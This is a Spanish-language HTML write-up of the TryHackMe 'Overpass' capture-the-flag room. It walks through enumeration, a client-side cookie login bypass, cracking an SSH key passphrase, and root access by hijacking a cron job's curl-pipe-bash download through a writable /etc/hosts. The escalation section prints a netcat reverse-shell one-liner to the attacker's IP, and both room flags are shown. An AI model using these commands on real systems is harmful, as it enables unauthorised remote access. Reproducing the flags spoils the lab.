<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Overpass — Writeup</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0a0c0f;
    --bg2: #0f1318;
    --bg3: #141920;
    --accent: #00ff9d;
    --accent2: #ff6b35;
    --accent3: #7b61ff;
    --text: #c8d6e5;
    --text-dim: #5a7080;
    --border: #1e2d3d;
    --red: #ff4757;
    --yellow: #ffd32a;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    font-size: 17px;
    line-height: 1.7;
    overflow-x: hidden;
  }

  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,255,157,0.015) 2px,
      rgba(0,255,157,0.015) 4px
    );
    pointer-events: none;
    z-index: 999;
  }

  header {
    position: relative;
    padding: 80px 0 60px;
    text-align: center;
    border-bottom: 1px solid var(--border);
    overflow: hidden;
  }

  header::before {
    content: '';
    position: absolute;
    inset: 0;
    background:
      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(123,97,255,0.1) 0%, transparent 70%),
      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(0,255,157,0.06) 0%, transparent 60%);
  }

  .header-tag {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    letter-spacing: 4px;
    color: var(--accent3);
    text-transform: uppercase;
    margin-bottom: 16px;
    opacity: 0.8;
  }

  h1 {
    font-family: 'Rajdhani', sans-serif;
    font-size: clamp(52px, 8vw, 96px);
    font-weight: 700;
    letter-spacing: -2px;
    color: #fff;
    line-height: 1;
    position: relative;
  }

  h1 .glow {
    color: var(--accent3);
    text-shadow: 0 0 40px rgba(123,97,255,0.6), 0 0 80px rgba(123,97,255,0.2);
  }

  .header-meta {
    margin-top: 24px;
    display: flex;
    gap: 12px;
    justify-content: center;
    flex-wrap: wrap;
  }

  .tag {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    padding: 4px 12px;
    border: 1px solid;
    letter-spacing: 2px;
  }
  .tag.linux  { border-color: var(--accent);  color: var(--accent); }
  .tag.web    { border-color: var(--accent3); color: var(--accent3); }
  .tag.js     { border-color: var(--yellow);  color: var(--yellow); }
  .tag.cron   { border-color: var(--accent2); color: var(--accent2); }
  .tag.hosts  { border-color: var(--red);     color: var(--red); }

  .container {
    max-width: 900px;
    margin: 0 auto;
    padding: 0 32px;
  }

  .phase {
    padding: 64px 0;
    border-bottom: 1px solid var(--border);
  }

  .phase-header {
    display: flex;
    align-items: center;
    gap: 20px;
    margin-bottom: 36px;
  }

  .phase-num {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: var(--accent);
    letter-spacing: 3px;
    white-space: nowrap;
    opacity: 0.7;
  }

  .phase-line {
    flex: 1;
    height: 1px;
    background: linear-gradient(90deg, var(--border), transparent);
  }

  h2 {
    font-family: 'Rajdhani', sans-serif;
    font-size: 32px;
    font-weight: 700;
    color: #fff;
    letter-spacing: 1px;
    margin-bottom: 24px;
  }

  h2 .accent  { color: var(--accent); }
  h2 .accent2 { color: var(--accent2); }
  h2 .accent3 { color: var(--accent3); }
  h2 .yellow  { color: var(--yellow); }
  h2 .red     { color: var(--red); }

  p {
    color: var(--text);
    margin-bottom: 16px;
    font-weight: 300;
    font-size: 17px;
  }

  .code-block {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-left: 3px solid var(--accent);
    padding: 20px 24px;
    margin: 20px 0;
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    color: #a8d8b0;
    overflow-x: auto;
    position: relative;
    line-height: 1.8;
    white-space: pre;
  }

  .code-block.js     { border-left-color: var(--yellow);  color: #f0e080; }
  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
  .code-block.shell  { border-left-color: var(--accent3); color: #b8a8e8; }

  .code-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    letter-spacing: 3px;
    color: var(--text-dim);
    text-transform: uppercase;
    margin-bottom: 8px;
  }

  .finding {
    background: var(--bg3);
    border: 1px solid var(--border);
    padding: 20px 24px;
    margin: 20px 0;
    position: relative;
  }

  .finding::before {
    content: '!';
    position: absolute;
    top: -1px;
    left: -1px;
    background: var(--accent2);
    color: #000;
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    font-weight: bold;
    padding: 2px 8px;
    letter-spacing: 2px;
  }

  .finding.info::before    { content: 'INFO';  background: var(--accent3); color: #fff; }
  .finding.success::before { content: 'PWN';   background: var(--accent);  color: #000; }
  .finding.vuln::before    { content: 'VULN';  background: var(--red); }
  .finding.explain::before { content: 'CÓMO FUNCIONA'; background: var(--yellow); color: #000; }

  .finding-title {
    font-family: 'Rajdhani', sans-serif;
    font-size: 14px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--text-dim);
    margin-bottom: 8px;
    padding-top: 4px;
  }

  .ports-table {
    width: 100%;
    border-collapse: collapse;
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    margin: 20px 0;
  }

  .ports-table th {
    text-align: left;
    color: var(--accent);
    letter-spacing: 3px;
    font-size: 10px;
    padding: 8px 16px;
    border-bottom: 1px solid var(--border);
  }

  .ports-table td {
    padding: 10px 16px;
    border-bottom: 1px solid rgba(30,45,61,0.5);
    color: var(--text);
  }

  .ports-table tr:hover td { background: rgba(0,255,157,0.03); }
  .port-open { color: var(--accent); }
  .port-num  { color: var(--accent2); font-weight: bold; }

  /* Diagrama de flujo del bug JS */
  .flow {
    display: flex;
    flex-direction: column;
    gap: 0;
    margin: 28px 0;
  }

  .flow-step {
    display: flex;
    gap: 16px;
    align-items: flex-start;
  }

  .flow-icon {
    width: 36px;
    height: 36px;
    border: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    color: var(--yellow);
    flex-shrink: 0;
    background: var(--bg2);
  }

  .flow-connector {
    width: 36px;
    display: flex;
    justify-content: center;
    flex-shrink: 0;
  }

  .flow-connector::before {
    content: '';
    width: 1px;
    background: linear-gradient(180deg, var(--border), transparent);
    min-height: 18px;
    display: block;
  }

  .flow-content {
    padding-bottom: 20px;
  }

  .flow-title {
    font-family: 'Rajdhani', sans-serif;
    font-weight: 700;
    font-size: 16px;
    color: #fff;
    margin-bottom: 2px;
  }

  .flow-desc {
    font-size: 15px;
    color: var(--text-dim);
    font-weight: 300;
  }

  code {
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    color: var(--accent);
    background: rgba(0,255,157,0.07);
    padding: 1px 6px;
  }

  code.js  { color: var(--yellow); background: rgba(255,211,42,0.07); }
  code.bad { color: var(--red);    background: rgba(255,71,87,0.07); }

  .flag-box {
    background: rgba(0,255,157,0.04);
    border: 1px solid rgba(0,255,157,0.2);
    padding: 16px 24px;
    margin: 20px 0;
    display: flex;
    align-items: center;
    gap: 16px;
  }

  .flag-label {
    font-family: 'Share Tech Mono', monospace;
    font-size: 10px;
    letter-spacing: 3px;
    color: var(--accent);
    white-space: nowrap;
  }

  .flag-value {
    font-family: 'Share Tech Mono', monospace;
    font-size: 14px;
    color: #fff;
    word-break: break-all;
  }

  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }

  .chain-step { display: flex; gap: 20px; align-items: flex-start; }

  .chain-icon {
    width: 40px;
    height: 40px;
    border: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    color: var(--accent);
    flex-shrink: 0;
    background: var(--bg2);
  }

  .chain-connector {
    width: 40px;
    display: flex;
    justify-content: center;
    padding: 4px 0;
    flex-shrink: 0;
  }

  .chain-connector::before {
    content: '';
    width: 1px;
    height: 100%;
    background: linear-gradient(180deg, var(--border), transparent);
    min-height: 20px;
    display: block;
  }

  .chain-content { padding-bottom: 24px; }

  .chain-title {
    font-family: 'Rajdhani', sans-serif;
    font-weight: 700;
    font-size: 18px;
    color: #fff;
    margin-bottom: 4px;
  }

  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }

  footer { padding: 48px 0; text-align: center; }

  .footer-text {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: var(--text-dim);
    letter-spacing: 3px;
  }

  .divider {
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--border), transparent);
    margin: 8px 0;
  }

  .highlight { color: var(--accent2); }
</style>
<style>.back-nav{position:fixed;top:20px;left:20px;z-index:1000;font-family:"Share Tech Mono",monospace;font-size:11px;letter-spacing:2px;color:var(--text-dim);text-decoration:none;padding:8px 16px;border:1px solid var(--border);background:rgba(10,12,15,0.85);backdrop-filter:blur(8px);transition:all .2s;text-transform:uppercase;}.back-nav:hover{color:var(--accent3);border-color:var(--accent3);}</style></head>
<body>
<a href="../index.html" class="back-nav">← Volver</a>

<header>
  <div class="container">
    <div class="header-tag">// TryHackMe — CTF Writeup</div>
    <h1>OVER<span class="glow">PASS</span></h1>
    <div class="header-meta">
      <span class="tag linux">#linux</span>
      <span class="tag web">#web</span>
      <span class="tag js">#broken-auth</span>
      <span class="tag hosts">#hosts-hijacking</span>
    </div>
  </div>
</header>

<main class="container">

  <!-- FASE 1: RECONOCIMIENTO -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 01</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
    <p>Se lanza un escaneo completo para descubrir la superficie de ataque disponible.</p>

    <div class="code-label">escaneo inicial</div>
    <div class="code-block cmd">nmap -p- -T5 &lt;IP&gt; -oG allPorts</div>

    <table class="ports-table">
      <thead>
        <tr>
          <th>PUERTO</th>
          <th>ESTADO</th>
          <th>SERVICIO</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="port-num">22/tcp</td>
          <td class="port-open">OPEN</td>
          <td>SSH</td>
        </tr>
        <tr>
          <td class="port-num">80/tcp</td>
          <td class="port-open">OPEN</td>
          <td>HTTP</td>
        </tr>
      </tbody>
    </table>

    <p>La superficie es reducida: una web y SSH. Se enumera la web con gobuster y se descubre el directorio <code>/admin</code>, que contiene un panel de login.</p>

    <div class="code-label">fuzzing de directorios</div>
    <div class="code-block cmd">gobuster dir -u "http://&lt;IP&gt;/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,txt,html,js</div>
  </section>

  <!-- FASE 2: BROKEN AUTH -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 02</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="yellow">BROKEN AUTHENTICATION</span> — Bypass del login</h2>

    <p>Inspeccionando el código fuente de <code>/admin</code> se encuentra el fichero <code>login.js</code>, que contiene toda la lógica de autenticación del lado del cliente. Esto es ya una señal de alerta: <strong>la validación de sesión no debería depender del navegador</strong>.</p>

    <p>El flujo del login funciona así:</p>

    <div class="flow">
      <div class="flow-step">
        <div class="flow-icon">1</div>
        <div class="flow-content">
          <div class="flow-title">El usuario envía credenciales</div>
          <div class="flow-desc">El formulario hace un POST a <code>/api/login</code> con usuario y contraseña.</div>
        </div>
      </div>
      <div class="flow-step">
        <div class="flow-connector"></div>
        <div></div>
      </div>
      <div class="flow-step">
        <div class="flow-icon">2</div>
        <div class="flow-content">
          <div class="flow-title">El servidor responde con texto</div>
          <div class="flow-desc">Si las credenciales son incorrectas, el servidor devuelve la cadena <code class="bad">"Incorrect credentials"</code>. Si son correctas, devuelve un <strong>token de sesión</strong>.</div>
        </div>
      </div>
      <div class="flow-step">
        <div class="flow-connector"></div>
        <div></div>
      </div>
      <div class="flow-step">
        <div class="flow-icon">3</div>
        <div class="flow-content">
          <div class="flow-title">El cliente decide si redirigir</div>
          <div class="flow-desc">El JavaScript comprueba si la respuesta es <code class="bad">"Incorrect credentials"</code>. Si NO lo es, ejecuta <code class="js">Cookies.set("SessionToken", statusOrCookie)</code> y redirige a <code>/admin</code>.</div>
        </div>
      </div>
    </div>

    <div class="finding vuln">
      <div class="finding-title">¿Dónde está el bug?</div>
      La comprobación de si el login fue exitoso se hace <strong>en el navegador</strong>, no en el servidor. El código solo verifica que la respuesta <em>no sea</em> el texto "Incorrect credentials" para establecer la cookie y redirigir. Esto significa que podemos saltarnos el login entero simplemente <strong>creando la cookie manualmente</strong> desde la consola del navegador, con cualquier valor que no esté vacío.
    </div>

    <div class="code-label">código vulnerable (login.js)</div>
    <div class="code-block js">const statusOrCookie = await response.text()
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value = ""
} else {
    Cookies.set("SessionToken", statusOrCookie)  // ← se guarda lo que sea
    window.location = "/admin"                   // ← y redirige sin más comprobación
}</div>

    <div class="finding explain">
      <div class="finding-title">Explotación</div>
      Abrimos la consola del navegador (F12) y ejecutamos directamente la misma llamada que haría el JS en caso de login exitoso, pero con un valor arbitrario. El servidor en <code>/admin</code> solo comprueba que la cookie <code>SessionToken</code> <em>exista</em>, no que sea válida.
    </div>

    <div class="code-label">bypass desde la consola del navegador</div>
    <div class="code-block js">Cookies.set("SessionToken", "");</div>

    <p>Al recargar <code>/admin</code> el servidor ve la cookie presente y nos da acceso. Encontramos una nota de Paradox para James junto a su <strong>clave RSA privada</strong> para acceder por SSH.</p>
  </section>

  <!-- FASE 3: SSH -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 03</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="accent">ACCESO SSH</span> — Cracking de la clave RSA</h2>

    <p>La clave obtenida está cifrada (<code>Proc-Type: 4,ENCRYPTED</code>), por lo que se necesita la passphrase. Se usa <code>ssh2john</code> para convertirla a un formato que john pueda crackear:</p>

    <div class="code-label">cracking de la passphrase</div>
    <div class="code-block cmd">ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</div>

    <div class="code-label">acceso al sistema</div>
    <div class="code-block cmd">chmod 600 id_rsa
ssh -i id_rsa james@&lt;IP&gt;</div>

    <div class="flag-box">
      <span class="flag-label">USER FLAG</span>
      <span class="flag-value">thm{65c1aaf000506e56996822c6281e6bf7}</span>
    </div>
  </section>

  <!-- FASE 4: PRIVESC -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// 04</span>
      <div class="phase-line"></div>
    </div>
    <h2><span class="accent2">PRIVILEGE ESCALATION</span> — Cron + /etc/hosts hijacking</h2>

    <p>Revisando el crontab del sistema se descubre una tarea ejecutada por root cada minuto:</p>

    <div class="code-label">/etc/crontab</div>
    <div class="code-block output">* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash</div>

    <p>Root descarga un script desde <code>overpass.thm</code> y lo ejecuta directamente con bash. El vector de ataque es claro: si controlamos a qué IP resuelve <code>overpass.thm</code>, controlamos qué script ejecuta root.</p>

    <p>El fichero <code>/etc/hosts</code> tiene permisos de escritura para todos los usuarios. Se añade nuestra IP de la VPN apuntando a <code>overpass.thm</code>:</p>

    <div class="code-label">/etc/hosts modificado</div>
    <div class="code-block output">127.0.0.1       localhost
127.0.1.1       overpass-prod
192.168.170.129 overpass.thm     ← nuestra IP</div>

    <p>Ahora hay que servir el script malicioso desde nuestra máquina en la ruta exacta que espera el cron: <code>/downloads/src/buildscript.sh</code>. El script lanza una reverse shell:</p>

    <div class="code-label">preparación del servidor malicioso</div>
    <div class="code-block cmd">mkdir -p downloads/src
echo '#!/bin/bash' > downloads/src/buildscript.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&amp;1|nc 192.168.170.129 4444 >/tmp/f' >> downloads/src/buildscript.sh
python3 -m http.server 80</div>

    <p>Se pone netcat en escucha y se espera a que el cron dispare:</p>

    <div class="code-label">listener</div>
    <div class="code-block cmd">python3 ~/exploits/penelope.py 4444</div>

    <div class="code-block output">root@ip-10-81-148-134:~# whoami
root</div>

    <div class="flag-box">
      <span class="flag-label">ROOT FLAG</span>
      <span class="flag-value">thm{7f336f8c359dbac18d54fdd64ea753bb}</span>
    </div>
  </section>

  <!-- RESUMEN -->
  <section class="phase">
    <div class="phase-header">
      <span class="phase-num">// RESUMEN</span>
      <div class="phase-line"></div>
    </div>
    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>

    <div class="chain">
      <div class="chain-step">
        <div class="chain-icon">01</div>
        <div class="chain-content">
          <div class="chain-title">Enumeración Web</div>
          <div class="chain-desc">Gobuster descubre <code>/admin</code> con panel de login y su lógica JS expuesta en <code>login.js</code></div>
        </div>
      </div>
      <div class="chain-step"><div class="chain-connector"></div><div></div></div>

      <div class="chain-step">
        <div class="chain-icon">02</div>
        <div class="chain-content">
          <div class="chain-title">Broken Authentication</div>
          <div class="chain-desc">La autenticación se valida en el cliente. Crear la cookie <code>SessionToken</code> manualmente desde la consola bypasea el login completamente</div>
        </div>
      </div>
      <div class="chain-step"><div class="chain-connector"></div><div></div></div>

      <div class="chain-step">
        <div class="chain-icon">03</div>
        <div class="chain-content">
          <div class="chain-title">Acceso SSH como James</div>
          <div class="chain-desc">Clave RSA privada obtenida del panel admin → passphrase crackeada con john → shell como james</div>
        </div>
      </div>
      <div class="chain-step"><div class="chain-connector"></div><div></div></div>

      <div class="chain-step">
        <div class="chain-icon" style="border-color: var(--accent2); color: var(--accent2);">04</div>
        <div class="chain-content">
          <div class="chain-title">Cron + /etc/hosts hijacking</div>
          <div class="chain-desc"><code>/etc/hosts</code> es escribible → se redirige <code>overpass.thm</code> a nuestra IP → el cron de root ejecuta nuestra reverse shell</div>
        </div>
      </div>
      <div class="chain-step"><div class="chain-connector"></div><div></div></div>

      <div class="chain-step">
        <div class="chain-icon" style="border-color: var(--accent); color: var(--accent);">⚡</div>
        <div class="chain-content">
          <div class="chain-title" style="color: var(--accent);">Root</div>
          <div class="chain-desc">Reverse shell recibida como root en menos de un minuto</div>
        </div>
      </div>
    </div>
  </section>

</main>

<footer>
  <div class="container">
    <div class="divider"></div>
    <br>
    <div class="footer-text">OVERPASS // WRITEUP // TRYHACKME</div>
  </div>
</footer>

</body>
</html>
